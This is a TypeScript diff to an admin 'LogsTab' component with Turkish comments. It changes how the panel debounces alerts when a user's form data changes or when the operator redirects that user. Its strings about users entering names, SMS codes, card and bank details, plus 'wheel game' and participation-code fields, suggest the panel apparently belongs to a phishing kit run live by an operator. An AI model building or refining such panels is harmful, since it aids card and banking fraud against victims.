@@ -953,7 +953,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     // Global AdminNotifier ile ayni olay icin cift bildirimi engelle
     const w = window as any;
     const now = Date.now();
-    if (w.__adminNotifyAt && now - w.__adminNotifyAt < 800) return;
+    if (w.__adminNotifyAt && now - w.__adminNotifyAt < 2000) return;
     w.__adminNotifyAt = now;
     try {
       if (soundEnabledRef.current) playBeautifulNotification();
@@ -973,6 +973,9 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   };
   const toastRedirect = (step: string, label?: string) => {
     try {
+      const w = window as any;
+      w.__lastAdminActionAt = Date.now();
+      w.__adminNotifyAt = Date.now();
       showBeautifulToast("Yönlendirildi", `Kullanıcı "${label || ROUTE_LABELS[step] || step}" sayfasına yönlendirildi.`);
     } catch { /* ignore */ }
   };
@@ -1147,19 +1150,24 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           }
 
           if ((soundEnabledRef.current || notifEnabledRef.current) && oldRow) {
-            const getSignificantData = (data: any) => {
-              if (!data) return {};
-              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
-              return rest;
-            };
+            const w = window as any;
+            if (w.__lastAdminActionAt && Date.now() - w.__lastAdminActionAt < 3000) {
+              // Admin yonlendirmesi sirasinda cift bildirimi engelle
+            } else {
+              const getSignificantData = (data: any) => {
+                if (!data) return {};
+                const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
+                return rest;
+              };
 
-            const oldSignificant = getSignificantData(oldRow.form_data);
-            const newSignificant = getSignificantData(newRow.form_data);
-            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
-            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
+              const oldSignificant = getSignificantData(oldRow.form_data);
+              const newSignificant = getSignificantData(newRow.form_data);
+              const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
+              const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";
 
-            if (isFormDataChanged || isUserSubmittedToWait) {
-              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+              if (isFormDataChanged || isUserSubmittedToWait) {
+                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
+              }
             }
           }
 
